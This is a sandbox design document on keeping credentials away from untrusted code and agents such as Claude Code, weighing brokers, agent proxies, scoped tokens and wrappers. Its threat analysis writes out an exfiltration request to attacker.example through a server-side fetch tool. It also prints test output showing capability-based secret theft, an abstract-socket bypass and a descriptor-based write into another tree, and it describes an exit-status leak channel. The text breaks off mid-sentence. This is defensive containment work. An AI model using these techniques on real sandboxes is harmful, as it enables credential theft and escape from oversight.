# Secrets

How a credential the host holds is made useful to code snug does not trust.

**[M]** measured on this host 2026-09-01 · **[M-prior]** measured 2026-08-13 and
not re-measured since · **[R]** read from source or a vendor bundle, not
executed. Versions at measurement: snug `f47beda`, claude 2.1.252, gh 2.98.0,
podman 6.0.2, bwrap 0.11.2, git 2.55.0, Go 1.27.0, kernel 7.2.0.

The distinction is not bookkeeping. A carried measurement is one nobody has run
against this tree, and at least one of the ones below was **wrong** when re-read:
the `gh` token's scopes no longer include `admin:public_key`, which was the
worked example under §7.2.

There is no single mechanism. There are four, a test that picks one, and a list
of shapes that are refused with the measurement that refused them. §7 is not an
appendix: a refusal without its measurement gets re-proposed within a quarter.

---

## 1. The rule

> **No credential enters the sandbox. A capability may — under a profile that
> names it.**
>
> A *credential* is a bearer secret that is broad, long-lived, or self-renewing:
> it can mint further access, and revoking it costs the human something. A
> *capability* is scoped, independently revocable, and its worst case fits in one
> sentence. **Which one a given secret is, is measured, not asserted — if you
> cannot write the blast radius in one sentence, it is a credential.**
>
> A capability enters only under an opt-in profile, never in `defaults`, and that
> profile's TOML carries its abuse sentence and its blast radius. `--dry-run`
> names every secret the run places inside, and where.
>
> **A broker answers from what the policy pinned, not by filtering what the host
> offers.** The sandbox can neither enumerate what else exists nor request it.
> Where snug cannot broker and must place a secret inside, it places the smallest
> form that works, and the profile states what that form still grants.

Two clauses that are definitional rather than structural, and are therefore not
exceptions:

> *Public material is not a secret.* A public key, username, email or host
> fingerprint is generated into the sandbox on purpose. Without this said out
> loud, the rule appears to forbid `known_hosts`, the pinned `.gitconfig`'s
> `user.email` and `hosts.yml`'s account name.

> *A broker stays small, snug's own, and reviewable — **never a user-supplied
> script, and never a host command whose arguments the sandbox chose**.*

And the closing rule, because it is the failure mode this area actually has:

> The failure mode of a missing or broken adapter is **"that tool has no
> credentials inside"** — a hard error, visible and annoying. It is **never** a
> fallback to injection.

### 1.1 The severity model — how credential-or-capability is decided

Four axes, ordered by how much each should move the verdict.

| axis | question | why it dominates the one below |
|---|---|---|
| **A1 — lifetime** | does the authority end when the sandbox ends? | an authority that ends with the run cannot be exfiltrated usefully |
| **A2 — self-extension** | can it mint, renew or widen itself? | a token that mints another makes A1 unbounded no matter what A1 measured |
| **A3 — scope** | how much does the issuer permit? | enforced by someone other than us, so it survives our bugs |
| **A4 — worst case** | one sentence, concrete | if it cannot be written, the answer is "credential" |

**A2 true → never inject, regardless of how narrow A3 looks.** A refresh token,
an SSH-key-minting scope and a token that can create another token are the same
row. Every mechanism in §3 is an answer to A1 and A2; only §3.3 answers A3.

---

## 2. What snug does today

| what | how it reaches the sandbox | who can read it inside | class |
|---|---|---|---|
| ssh key material | **nothing enters.** `internal/sshproxy` answers `REQUEST_IDENTITIES` with one pinned blob (`proxy.go`) and signs only for it | — | capability |
| GitHub token | `oauth_token:` in a generated `hosts.yml` (`internal/cli/identity.go:330`) | every process in the sandbox | **credential** |
| Anthropic token | a generated `~/.claude/.credentials.json` carrying five allowlisted fields (`internal/policy/claudecreds.go:88`) — `refreshToken` and `refreshTokenExpiresAt` are not among them | every process in the sandbox | **credential** — see below |
| git identity | generated `~/.gitconfig`: `user.name`, `user.email`, and `insteadOf` rewriting `https://<host>/` to `git@<host>:` (`internal/policy/gitextract.go:131`) | — | public material |
| registry auth | nothing on this host to inherit **[M]** — no `~/.docker/config.json`, no `auth.json` under `~/.config/containers` or `$XDG_RUNTIME_DIR/containers` | — | — |

On this host the GitHub token is **keyring-backed**: `hosts.yml` is 84 bytes and
holds no token at all **[M]**, `gh auth token` reaches secret-service over D-Bus,
and snug refuses D-Bus. Scopes measured: `gist`, `project`, `read:org`,
`read:packages`, `repo`. That row is the one place snug still places a credential
inside, and §6.3 is what it is waiting for.

**The Anthropic token is classed a credential, and the reason is A2 rather than
lifetime.** Dropping `refreshToken` removed renewal, which is why the row reads
"hours". It did not remove **minting**: the client ships
`/api/oauth/claude_cli/create_api_key` **[R]**, and an API key minted there is
durable and outlives the sandbox. Whether *this* token is accepted at that
endpoint is **unmeasured** — settling it would create a real key on the human's
account — so it is treated as A2-true, because §1.1's rule is not "A2 measured
true" but "if you cannot write the blast radius in one sentence". Today what
bounds it is that `@claude` does not include `@net`: a **network** defence, not a
property of the token. That is worth stating in exactly those words, because a
profile combination the user is free to write (`-p @claude -p @net`) removes it.

**`git` needs no credential.** With `insteadOf` plus the ssh-agent proxy, clone,
fetch and push work with nothing inside. A credential helper in the sandbox would
have nothing to do, and the host's own helper is not inherited.

---

## 3. The four mechanisms

Each carries its abuse sentence — the thing a hostile process inside can do with
it — because a mechanism without one has not been thought about.

### 3.0 No credential at all

**Abuse:** *nothing; it cannot authenticate.* Zero code. The default and the
floor. The interesting question is never whether this should be the default but
what the smallest departure from it is that makes the tool work.

### 3.1 The broker — the tool's own protocol over a socket snug owns

snug holds the credential on the host, speaks the tool's protocol, and the
sandbox points at it with the tool's own configuration knob.

**Abuse:** *a hostile process can issue, with your full identity, any request the
allowlist permits, with a body it chose, for the sandbox's lifetime. It cannot
read the credential and cannot use the account afterwards. Whether it can make
data leave the machine depends on what the vendor will do with a body snug does
not inspect — see §3.1.1, which is why "cannot reach an endpoint outside the
allowlist" is NOT part of this sentence.*

**The transport is an AF_UNIX socket and needs no network grant. [M]** Claude Code
honours `ANTHROPIC_UNIX_SOCKET=<path>`, which selects undici's `{unix: path}`
dispatcher for Anthropic API requests only **[R]**. Measured against a mock API
inside `bwrap --unshare-net`, with **no credential file present at all**:

| arm | result |
|---|---|
| headless `claude -p`, no network, socket only | completes, prints the answer, exit 0 |
| interactive on a real pty, no network, socket only | starts, renders, completes a turn |
| `/status` · `/model` · `/usage` | **no API call at all** |
| the whole endpoint set, every arm | `POST /v1/messages?beta=true` |

The two POSTs per turn are two *models* — `/usage` attributes them to
`claude-haiku-4-5` and `claude-sonnet-5` — not two endpoints. So the allowlist is
**one rule**. The sandbox carries a placeholder snug wrote (`ANTHROPIC_API_KEY`
arrives as `x-api-key`, `ANTHROPIC_AUTH_TOKEN` as `Authorization: Bearer`) and the
host side replaces it. OAuth credentials are ignored in this mode: its refusal is
`Not logged in · Please run /login`. Upstream treats it as a supported shape —
`ANTHROPIC_UNIX_SOCKET`, `CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST` and
`CLAUDE_CODE_HOST_AUTH_ENV_VAR` are one predicate, and the bundle's own string is
*"the local proxy is API-key-authed"* **[R]**.

Four things a broker must get right, each measured rather than reasoned:

- **`http://` scheme.** TLS over the socket **hangs** rather than erroring.
- **Absolute-form request lines.** With `HTTPS_PROXY` in the environment the
  client sends `POST http://api.anthropic.com/v1/messages?beta=true`. Match the
  parsed path, or a user with a proxy in their shell gets a 404 for the session.
- **Refusals must be 4xx.** A 500 is retried seven times in ~55 s.
- **`ANTHROPIC_BASE_URL` becomes snug-authored, not inherited.** Inheriting it
  lets a host gateway setting disable the broker silently — invariant 5.

#### 3.1.1 The allowlist is default-deny, and "one rule" was a sizing measurement

**"The whole endpoint set is one path" is a measurement of what the CLIENT sends.
It is not a safety property, and reading it as one is the mistake this section
exists to stop.** The attacker is not `claude`: the payload speaks raw HTTP to the
socket and picks its own path. Measured **[M]**: inside `bwrap --unshare-net`,
with `curl` to `1.1.1.1` returning exit 7 as the negative control, a plain `sh`
plus `curl --unix-socket` reached the socket and had a request of its choosing
forwarded.

So the broker is **default-deny on the path**, and the paths it must refuse are
named rather than left to the default: `/api/oauth/claude_cli/create_api_key`,
`/api/oauth/claude_cli/roles`, `/api/oauth/cri` **[R]**. A broker that attaches
the real credential to whatever path arrives is a **durable-key-minting oracle
reachable from a sandbox with no network grant**, which is strictly worse than
injecting a token that expires in hours. Any prototype that forwards
`self.path` verbatim has this shape.

And the path is only the first surface. The second one is the body:

The endpoint is not the exfiltration surface; the **body** is. A payload does not
have to use the tool the broker was built for — it has a shell, and the broker's
address. It writes its own request naming a **server-side** tool, one the vendor's
own machines execute against a URL the body chose:

```
POST /v1/messages   { "messages": [{"role":"user","content":"https://attacker.example/?d=<stolen>"}],
                      "tools": [{"type":"web_fetch_20250910","name":"web_fetch"}] }
```

That matches a `(method, path)` allowlist exactly, so snug forwards it, and the
data leaves a sandbox with no route off the box. **The client half is measured
[M]**: inside `bwrap --unshare-net` — negative control `curl` to `1.1.1.1`
returning exit 7, no route — a plain `sh` plus `curl --unix-socket` reached the
allowlisted endpoint with exactly the body above, and a `(method, path)` allowlist
accepted it. No agent involved: the tool the broker was built for is not the
attacker. Two facts bound how bad this is,
and one question decides it:

- **Refusing server tools would not break the client. [M-prior]** Claude Code's
  own substantive turn carries 25 tool blocks and **not one of them has a `type`
  field** — its `WebFetch`/`WebSearch` are client-side tools it executes itself.
  So the filter is one key at one depth: *refuse any element of `tools[]` carrying
  a `type`*. It is not free — it means decoding a ~187 KB body per turn and
  inheriting the whole "two parsers disagree about a spelling" escape class that
  `(method, path)` was chosen to avoid, including the anti-rot shape that asks
  `encoding/json` whether it accepts a spelling snug rejects.
- **`web_fetch`'s own anti-exfiltration control does not bind this attacker
  [R]:** it may only fetch URLs that already appeared in the conversation, and
  the payload writes the conversation.
- **UNRESOLVED: does this credential permit server-side tools at all?** Settling
  it needs one real request to the vendor with a live credential, which no
  measurement in this project spends without the owner's explicit consent. The
  safe experiment is one `POST /v1/messages` carrying
  `tools: [{"type":"web_fetch_20250910","name":"web_fetch"}]` and a user message
  naming a URL on a listener the owner controls, recording **separately** whether
  the API rejects the block and whether the listener is hit.

**Until that is answered the broker is not buildable as one rule.** If server
tools are refused for the credential, the broker is smaller than
`internal/sshproxy` and has no body decode. If they are permitted, it needs the
body filter above — and the honest zero-code alternative is to say plainly that
`@claude` either runs offline and does not work, or runs with `@net` and the token
is inside.

#### 3.1.2 Where the broker runs, which is settled

- **Host side: a goroutine in P0 serving a unix socket**, bind-mounted in through
  `Policy.BindSocket` (`internal/policy/types.go:659`), exactly as the identity
  and container sockets already are. Not a third process: `setns(CLONE_NEWNET)`
  from P0 returns **EPERM [M-prior]**, and the conclusion once drawn from that —
  that the broker forces the stage topology onto `@claude`, giving the profile
  most likely to be running hostile input a `CAP_SYS_ADMIN` ancestor for the whole
  run — does not follow. **With `ANTHROPIC_UNIX_SOCKET` no part of the broker is
  in the sandbox's netns at all:** a pathname AF_UNIX socket is a filesystem
  object, not a netns object, so the listener sits in P0 in the host netns and
  reaches the sandbox as a bind mount. The netns question arises only for the
  *fallback relay* below, which must be in the sandbox's netns and carries no
  credential. Stating those as one sentence is how the earlier refutation reached
  its conclusion.
- **No `deriveTopology` change, no new lattice point, no `CAP_SYS_ADMIN`
  ancestor** — `internal/cli/identity.go:169-177` is the shipped precedent at the
  same topology: `sshproxy.New` (which listens and `chmod`s `0600` before
  returning), `go p.Serve()` in P0, then `pol.BindSocket`.
- **The broker is an egress hole in a sandbox whose screen says there is none,
  and the screen must say so.** `internal/cli/dryrun.go`'s `NetIsolated` arm
  prints "No egress. No host loopback." A mediated route off the box exists for a
  run with no `@net`; §3.1.1's body-exfiltration analysis is the sharp end of it,
  but `describeNetwork` needs a broker clause the way it grew `renderHTTPDoors`
  after issue #541, or three renderings of one policy disagree again. This is the
  `ENGINE-NETNS.md` §0 shape: a limitation and a hole are the same fact facing two
  directions. A two-turn tool loop completed behind a one-rule allowlist inside
  `bwrap --unshare-net`, with an empty routing table, dead DNS and
  `connect: Network is unreachable` to `1.1.1.1:443` as printed negative controls
  **[M-prior]**.
- **`ANTHROPIC_UNIX_SOCKET` removes the in-sandbox forwarder entirely**, and with
  it four costs that were previously accepted: an extra process as the payload's
  parent, snug wrapping the payload argv (which interacts with `snug shell`), an
  availability regression if the payload kills it, and a second executable in
  `StagedBinDir`. The forwarder existed only because `ANTHROPIC_BASE_URL` must be
  an `http://host:port` URL — and the socket variable is the vendor's own answer
  to that. The forwarder stays in the design for tools that have **no** socket
  knob (below), never for this one.

**A tool with no unix-socket option is still reachable with no network grant.
[M]** Loopback is up inside an unshared netns with no `pasta`
(`bwrap --unshare-net` → `lo inet 127.0.0.1/8`; bind and connect both succeed), so
a snug-authored relay inside the sandbox carries `127.0.0.1:<port>` to the bound
socket. No `-T <port>` host-loopback splice, no DNS, no CA. The relay is
transport, not a boundary (§5.1).

**Where it suits:** any tool with a base-URL or socket knob and an allowlist
expressible in a handful of `(method, path, host)` rules. Anthropic is the best
case in the list. **The deciding rule:** *if the allowlist cannot be written in a
handful of rules, the tool does not want a broker — it wants §3.3.*

### 3.2 The agent proxy — the credential stays in something that already speaks a protocol

`internal/sshproxy` is the shipped instance and the calibration point for every
other hole: A1 false, A2 false, the filter reviewable in an afternoon.

**Abuse:** *a hostile process gets a signing oracle for one pinned key, for the
sandbox's lifetime. It cannot enumerate other keys, cannot extract material, and
cannot sign after the sandbox exits.*

It does not generalise, because nothing else ships an agent. `gpg-agent` is the
one other candidate (commit signing, `pass`).

### 3.3 A smaller credential, issued by the vendor

The human — or snug — obtains a credential narrow enough that holding it is
tolerable: a GitHub App installation token (one hour, repository- and
permission-scoped, cannot mint another), a fine-grained PAT, an STS session with
an inline policy.

**Abuse:** *whatever the vendor's scope permits, for the credential's lifetime,
which may outlive the sandbox.*

**It is the strongest single lever available, because its enforcement is not
ours.** Every other mechanism converts "a secret the agent can read" into "a
secret behind a parser the agent can attack". A scoped token is enforced by the
vendor whether or not every line of snug is wrong.

Two amplifiers worth naming: **snug can revoke what snug minted at teardown**,
which converts A1 to "dies with the sandbox" for a bearer token in one HTTP call;
and where the repository's own automation already holds a job-lifetime token,
there is no minting to do at all.

> **If you cannot bound the authority, do not accept the credential — get a
> smaller one issued.**

### 3.4 The wrapper — snug runs the tool, in a place the payload is not

`/snug/bin/<tool>` (`policy.StagedBinDir`, `internal/policy/snugns.go:60`) is a
snug-authored program on the sandbox's `PATH`. It does not hold the secret and it
does not judge anything. It asks snug, over a socket, to run the real tool
somewhere the credential is — and snug owns that place's whole lifecycle.

**Abuse:** *a hostile process can invoke the tool with argv and descriptors it
chose, as many times as the budget allows, for the sandbox's lifetime. Everything
the tool prints reaches the payload. It cannot read the credential's file, its
memory or its environment. It cannot spend the credential after the sandbox
exits. It CAN spend it at the vendor while the sandbox lives, including on
operations that create durable state.*

Two placements, and the choice is not free:

- **A goroutine in P0**, reached through a `0600` socket bind-mounted in. Not
  *beside* the payload: outside its pid and mount namespaces, so §7.6's
  `/proc/<pid>/mem` read has no pid to name. Correct where the helper is snug's
  own code and small — `internal/sshproxy` and the container proxy are both this
  shape already. **A helper under a different uid inside the payload's own
  namespaces is refused; §5.2 has the measurements and the four reasons.**
- **A sibling sandbox.** Separate pid and mount namespaces, same reason.
  Required where the thing being run is the *vendor's* binary rather than snug's
  code, because P0 is snug's own process. Costs a sandbox launch —
  **0.06 s** for a sibling with no network **[M]**, 245 ms with `@net`
  **[M-prior]**, where the difference is `pasta`.

**Stdio pass-through works, and it is what makes the wrapper usable. [M]** The
wrapper sends its own descriptors 0/1/2 over `SCM_RIGHTS`; snug uses them as the
tool's stdio. Descriptor passing crosses mount, pid, ipc, uts and net namespaces
— same kernel, same file-table entry. Measured through a real pty: `isatty` true
in the sibling, interactive reads work, stderr stays separate, the exit status
returns.

Naming the wrapper after the tool is honest **here**, unlike a verb-subset stub
(§7.4): a faithful pass-through implements the whole tool.

---

## 4. Choosing one

Answer in order. The first "yes" wins.

1. **Does the tool need a credential at all?** For `git`, no — §2. This is free
   and it is the answer more often than it looks.
2. **Does the tool have a base-URL, socket or endpoint knob, and an allowlist of
   a handful of `(method, path, host)` rules?** → **broker** (§3.1).
3. **Does the vendor issue something narrow, short-lived and unable to mint?** →
   **smaller credential** (§3.3). Take it even when another mechanism also
   applies: the mechanisms compose and this one survives our bugs.
4. **Otherwise, is the tool one snug can run on the payload's behalf, and does it
   satisfy all three of:**
   - no verb that prints its own credential (`gh auth token`,
     `git credential fill`, `aws configure get` each fail this);
   - **no repository as input** (§7.1);
   - no persistent state written where a later invocation reads it?

   → **wrapper** (§3.4).
5. **Otherwise the tool has no credentials inside, and snug says so.** That is
   the correct degradation: visible, annoying, harmless.

The escape hatch, and only this: a profile named `@<tool>-credentials` may stage
a real credential. Never in `defaults`, never implied by `include`, the abuse
sentence in its TOML, and `--dry-run` prints the value as `SECRET`. Its entire
value is that a human chose it under a name that cannot be mistaken for a
capability grant.

### 4.1 There is no adapter mechanism, and that is deliberate

No plugin API, no adapter registry, no generic description format. An adapter
runs on the HOST, reads the host's secrets and decides what enters the sandbox —
the most privileged position in the system, strictly above a profile, which can
only name paths. Executable plugins would load from a config layer that
`XDG_CONFIG_HOME` can repoint at a checked-out repository; today that hole yields
profile grants, with plugins it would yield host code execution.

What replaces the mechanism is a **bar**, because YAGNI stops a general mechanism
and does nothing to stop one-off adapters accreting, each individually justified:

1. Can the tool's credential handling be expressed in a handful of rules a human
   can read and verify? If not, it gets §3.3 and no code.
2. Is the tool's config format one the vendor will change under us? Cost accepted
   only where the alternative is a leak.
3. The failure mode of a broken adapter is a hard, visible error — never a
   fallback to injection.

**Profiles are already the extension point.** Anyone can write one in
`profiles.d` and stage their own credential with their own abuse sentence, no
snug code. What they cannot do is *broker*, and brokering is the part that needs
snug involved at all.

### 4.2 A secret selector must not be steerable by the target

Wherever a profile names *which* secret to use — an identity key, a credential
source, a broker's account — that name must not be expandable from `{…}`
variables the sandbox can influence. The repository is the material being
sandboxed; letting it choose the identity the sandbox acts under is the same
class of defect as letting it choose the credential, and invariant 3 is the same
rule one layer out. `internal/policy/identitykey_test.go` is the regression test,
and it exists because this rule was once asserted here as though it already held
when it did not.

### 4.3 Staging an executable is the most powerful thing in the model

A key that stages an executable grants **code that runs before the tool the human
named** — strictly more than any path grant, because a path grant cannot act.
`policy.StagedBinDir` is the one directory it may land in, and PATH precedence
rather than overmounting is why (`internal/policy/snugns.go`). Its abuse sentence
is written before the key is, not after; a scan of `/usr/bin` for things to
replace is the shape that turns "snug authored one replacement" into "snug
replaces host binaries it judges broken".

---

## 5. The wrapper contract

Everything the wrapper model buys comes from snug owning the lifecycle. The
wrapper itself buys nothing. This section is the whole of what snug owes.

### 5.1 The wrapper is not a boundary, and neither is the socket

The wrapper sits in `/snug/bin`, world-readable inside; the payload reads it,
learns the protocol and speaks to snug directly. Authentication of the *caller*
buys nothing where the caller is the payload by design. **Every check lives on
snug's side of the socket.**

That is the same property the ssh-agent proxy has and is not a defect: what the
socket grants is **use**, not **possession** — authority bounded by what snug will
do, ending when the sandbox ends. The comparison that matters is not socket
versus nothing but socket versus a file holding the credential, and the file
loses on every axis: copyable, outlives the run, grants everything.

What must be bounded is therefore **rate, concurrency and totals**, which is
accounting rather than authentication:

- a hard cap on live siblings — the payload structurally cannot create a
  namespace (**[M]** inside a default sandbox: `CapEff 0000000000000000`,
  `unshare(CLONE_NEWUSER)` EPERM, `clone3` ENOSYS) and the wrapper hands it
  namespace creation by proxy;
- a single-flight lock per credential, because a keyring-backed source turns N
  invocations into N unlock prompts or one unlock spent thousands of times;
- an invocation budget, surfaced in `--dry-run`;
- one in-flight call per sibling and per output pipe, because two calls sharing a
  credential fetch is where call A's argv reaches call B's tool.

### 5.2 The uid wall — measured, and then refused

A user namespace can map a *range*, and processes under different uids inside one
sandbox are walled from each other by ordinary DAC. **[M]** Helper as inner uid 1
(secret `0600`, socket `0600`), payload as inner uid 2 with `--no-new-privs
--inh-caps=-all --bounding-set=-all`, same mount and pid namespace, `/proc`
remounted in the new pidns:

```
connect helper socket      blocked  EACCES
read helper secret file    blocked  EACCES
read /proc/PID/mem         blocked  EACCES
list /proc/PID/fd          blocked  EACCES
read /proc/PID/environ     blocked  EACCES
kill(PID, 0)               blocked  EPERM
kill(PID, SIGKILL)         blocked  EPERM
setuid(1) become helper    blocked  EPERM
```

**That table is a measurement and not an explanation, and snug does not build
what it appears to license.** Four things are wrong with reading it as a
mechanism, in ascending order of how fatal they are.

**One — it confounds two causes, and at the uid the deployment would use, only
the second is doing anything. [M]** The payload above was inner uid 2 *and*
carried an empty capability set. Map the payload to inner uid **0** — the natural
result of `--map-root-user`, which is one way to satisfy cost 2 below — keep its
capabilities, and the wall is not there at all:

```
read helper secret (0600 in 0700)  ALLOWED  'the-credential-0123456789'
list /proc/PID/fd                  ALLOWED  ['0', '1', '2', '3']
read /proc/PID/environ             ALLOWED  'SHELL=/u'
connect helper socket              ALLOWED  b'served\n'
setuid(1) then read secret         ALLOWED  "now uid=1, secret='the-credential-0123456789'"
```

`CAP_DAC_OVERRIDE` walks a `0600` file in a `0700` directory and `CAP_SETUID`
*becomes* the helper; only `/proc/PID/mem` refuses, EIO, for an unrelated reason.
The identical payload at inner uid 0 with snug's own cap hygiene —
`CapEff 0000000000000000 CapBnd 0000000000000000`, `--no-new-privs` — is blocked
on all five again. So the precondition is *the payload holds an empty effective
AND bounding set with no-new-privs, at a non-zero inner uid*; at inner uid 0 the
capability set is the whole wall and DAC is decoration. Today's payload satisfies
both halves independently — inner uid 1000, uid_map `1000 0 1`
(`internal/sandbox/exec.go:410`), `CapEff` zero from `--cap-drop ALL`
(`internal/policy/bwrap.go:162`).

**Two — the baseline is wrong. Five of those eight rows need no uid at all.**
The harness put helper and payload in one pid namespace; snug never has to.
bwrap creates the payload's pid namespace and `--proc /proc` mounts a procfs *of
that namespace*, so every process snug starts outside it — P0, the stage,
anything left in NP, a sibling sandbox — has no pid the payload can name.
`internal/sandbox/exec.go:385` states it for the NP level: `/proc/<pid>` is
**ENOENT** there, "so neither its fd directory nor its mem is reachable". That
covers `/proc/PID/{mem,fd,environ}` and both `kill()` rows by namespace, with no
subuid, no argv change and no golden diff. What the uid split adds over the
namespace split is only the secret file and the socket — and:

**Three — `bwrap` has no `--chown`. [M]** `bwrap --help` (0.11.2) offers
`--perms`, `--chmod OCTAL PATH` and `--size`, and nothing that sets an owner. So
snug cannot ask the sandbox builder to create a helper-owned file or socket: both
must be created by the helper at run time, inside a directory on a writable tmpfs
that the payload owns — where the payload cannot *write* the secret but can
`unlink` or `rename` the directory entry and substitute its own. The wall's own
control channel becomes a path the payload controls, which §5.4 already refuses
under "no path-typed field crosses the boundary".

**Four — the implementation route either invents a re-exec verb or hands
`@claude` the ancestor §3.1.2 exists to avoid.** The payload's user namespace is
always a *descendant* of one snug already made that maps exactly **one** id:
flat path `internal/sandbox/exec.go:443` clones NP with
`UidMappings{ContainerID: 0, HostID: os.Getuid(), Size: 1}`; staged path
`internal/stage/fds.go:41` mapped by `stage.go:215`. A range cannot be added
below a one-id namespace — `user_namespaces(7)`'s rule that a child's map must be
a subset of the parent's **[R]**; the delegation has to happen at NP's own
creation, by `newuidmap`, from P0, before any current code runs, and then
`__inpidns` must create a *second* userns, write its multi-range map and hand the
fd to `bwrap --userns FD`. That is a new verb, a new fd, and
`internal/stage/subuid.go` shared out of the stage package. The route that looks
cheap — reuse `Topology.Subuid = SubuidFull` — is **a new lattice point in
effect**: `NeedsStage()` is `t.Netns >= NetnsStage || t.Subuid >= SubuidFull`
(`internal/policy/topology.go:130`), whose own comment keeps the disjunct so
"a future producer of SubuidFull must not silently lose its stage". A second
producer therefore gives the profile most likely to be running hostile input the
privileged ancestor §3.1.2 declines, and instantiates `{NetnsSandbox,
SubuidFull}` — the combination that comment says "never decides the answer for
anything Resolve produces", i.e. an untested arm of `runStaged`.

**The decision: the payload's user namespace does not change.**
`--unshare-user` stays, `--userns FD` is not reached for, `deriveTopology` is
untouched, no golden file moves — and the absence of a golden diff is the point,
because the change being refused is exactly the one that would produce one.
`internal/policy/unshareflags_test.go:27` is what makes that structural: it
asserts `--unshare-user` for every `NetnsOwner`, and `--userns FD` "cannot
combine with --unshare-user" **[M]**. Relaxing that test is the review's focal
point if a maintainer ever overrides this, along with rendering the fd through
`BwrapArgs`' deterministic stub allocator (`internal/policy/bwrap.go:16`) rather
than appending it in `internal/sandbox` — otherwise the only golden diff is the
*removal* of `--unshare-user`, with nothing naming what replaced it.

**And the niche is empty.** A wall is needed only for a secret-holding process
that must share the payload's *mount* or *net* namespace, and nothing specified
here does: `internal/sshproxy` and the container proxy already hold their
credentials in **P0**, unaddressable from the payload by construction
(`internal/cli/identity.go:177` is the shape — `sshproxy.New`, `go p.Serve()`,
`pol.BindSocket`), and §3.4's sibling sandbox covers "run the vendor's binary"
with its own mount, pid and net namespaces. **NP is not a third option for a
third-party binary:** it maps uid 0 to the human's host uid, so a process left
there carries the human's full host DAC — strictly more authority than P0.

Two results from the harness survive the refusal and are load-bearing elsewhere.

**The helper's channel is a `0600` PATHNAME node or an inherited `socketpair`,
never an abstract name. [M]** An abstract-namespace AF_UNIX socket has no inode,
so `connect()` checks no permission: it is scoped only by the network namespace,
which anything beside the payload **shares**. The same harness with
`bind("\0snug-helper-abstract")`:

```
[helper]  uid=1 bound abstract @snug-helper-abstract
[payload] uid=2 attacking abstract socket
  connect ABSTRACT socket   ALLOWED  got b'SECRET-SERVED\n'   <-- WALL BYPASSED
```

See §7.7, and note that §5.5's preference for an inherited descriptor over a
pathname is satisfied by the socketpair, never by an abstract address.

**A host listener can tell two callers apart. [M]** `SO_PEERCRED` translates
through the user namespace into the *listener's* ids: a host listener sees inner
uid 1 as host uid 1001 and inner uid 2 as 1002. Where snug ever has two distinct
host uids to distinguish — the container proxy's engine side, not the payload —
it pins its socket two ways and should do both: `chown` with mode `0600`, so the
**kernel** refuses at `connect()` with no code at all, and `SO_PEERCRED` as the
assertion that the chown is still what you think it is. It buys nothing inside
one sandbox, where every caller is one uid (§7.8).

Finally, two costs that would have applied and are worth keeping because they
bound the *whole* idea, not just this route:

1. **It would separate only processes snug STARTS.** A child the payload spawns
   inherits the payload's uid and nothing can make it drop. That splits *snug's
   helper* from *the payload*; it can never split *the agent* from *the shell the
   agent ran*.
2. **It changes who can READ the secret, not who can SPEND it.** The payload asks
   the helper to act; that is the helper's purpose. §5.1 survives unchanged, and
   this is why the refusal above costs the design nothing.

### 5.3 Descriptors the payload sends must be validated

**The payload chooses which descriptors it sends, and the sibling's policy is
irrelevant until snug checks them. [M]** A wrapper sending an `O_DIRECTORY`
descriptor for the payload's target where stdin is expected:

```
[sibling] /payload-target in MY mount ns: no
[sibling] fd0 is a DIRECTORY — reading the payload's tree through /proc/self/fd/0
[sibling]   /proc/self/fd/0/README -> payload owns this
[sibling] WROTE /proc/self/fd/0/PWNED into the payload's tree
```

— and the file is on the host afterwards. A directory descriptor ignores the
mount namespace entirely, so "the sibling gets its own profile set, with no
writable path shared with the payload" is undone by one `sendmsg`.

Refusing to forward descriptors at all costs the tty, and the tty is the point:
a pipe means no `isatty`, no password prompt, no progress bar, no `SIGWINCH`, no
`^C` to the right process group. **So validate rather than refuse:** `fstat` every
received descriptor and admit only character devices, fifos, sockets and regular
files; refuse `S_ISDIR` and anything `O_PATH` (`/proc/self/fdinfo` flags); and
where it is a tty, require it to be the tty snug gave the sandbox rather than any
tty the payload can open — compared on `st_rdev` and `st_ino`, because bwrap can
hand the payload a `ptmx` and "is a tty" is therefore not the question.

*Measurement discipline, because the first run of this looked like a refusal and
was not:* Python **refuses to start** with a directory as stdin
(`init_sys_streams: <stdin> is a directory`). That is the language runtime, not a
boundary — `/bin/sh` took it happily. A negative result that depends on which
interpreter ran is not a negative result.

### 5.4 Lifecycle, which is the whole reason snug runs the tool

- **No path-typed field crosses the boundary.** A path resolves in the tool's
  mount namespace, where the credential is, not in the payload's. `--body-file`,
  `-F k=@<path>`, an upload argument: aim one at the credential file or at
  `/proc/self/environ`. Validating "must be under the target" fails to a symlink
  planted in the shared target, because validation happens in snug's namespace and
  `open` happens in the tool's. File **content** crosses; snug materialises it at
  a path only snug names.
- **A control node snug wants owned by someone other than the payload cannot be
  created by the sandbox builder at all. [M]** `bwrap` 0.11.2 has `--perms` and
  `--chmod` and no `--chown`, so any such file or socket is created at run time by
  its owner, inside a directory whose ancestors the payload must not be able to
  `rename` or `unlink` — see §5.2.
- **Per-invocation, and it dies with the call.** A tool whose config directory
  persists turns "install an extension" into code that runs beside the credential
  on every later invocation.
- **Interrupting the wrapper must not orphan the tool. [M]** `^C` in the payload
  killed the wrapper and the sibling was **still running**, holding the secret and
  the payload's terminal descriptors, able to write to the human's terminal after
  the call that created it was gone. snug owns the lifetime: a pidfd on the
  wrapper's connection, the tool's process group killed on EOF, reaped before
  answering.
- **The environment is an allowlist.** Otherwise the tool inherits `GH_HOST`,
  `SSL_CERT_FILE`, `GIT_SSH_COMMAND`, `http_proxy`, `LD_PRELOAD` from a payload
  that chose them.
- **The exit status is a byte channel, and it is fast. [M-prior]** `snug <dir> --
  sh -c 'exit 137'` returns `137` — pinned by
  `test/integration/exitstatus_test.go` — so code beside a credential can do
  `exit(secret[i])` and leak a 40-byte token in a few seconds at one invocation
  each. **And do not clamp it in this shape anyway.** Clamping answers that
  channel only where stdout is not itself free. With stdio connected, stdout is an
  unlimited channel by design, so clamping buys nothing and breaks every caller
  that branches on the status. Clamp only where the output is also structured and
  filtered — and where it is clamped, the exit-status channel is what the
  invocation budget in §5.1 is bounding.
- **Redaction is accident hygiene, never a leg to count on.** The payload picks
  the argv, so it picks the encoding: base64, hex, URL- and JSON-escaping, case
  changes; any templating flag is an arbitrary function over data the tool holds.
  A streaming matcher needs an overlap buffer of `len(secret)-1`, and that buffer
  *is* the secret when it aligns. Redaction also fires visibly, making any verb
  that echoes a caller-supplied value a confirmation oracle.
- **A missing control refuses; it does not degrade.** No wall, no wrapper. No
  validated descriptors, no call.

### 5.5 Where the secret lives on snug's own side

- **The strongest form is never to receive it.** Where the credential can be
  re-queried from its source, wire that source's stdout straight into the tool's
  input descriptor. **[M-prior]** `os/exec` passes the descriptor through *iff* the
  writer is an `*os.File`, and silently interposes an `os.Pipe()` plus an
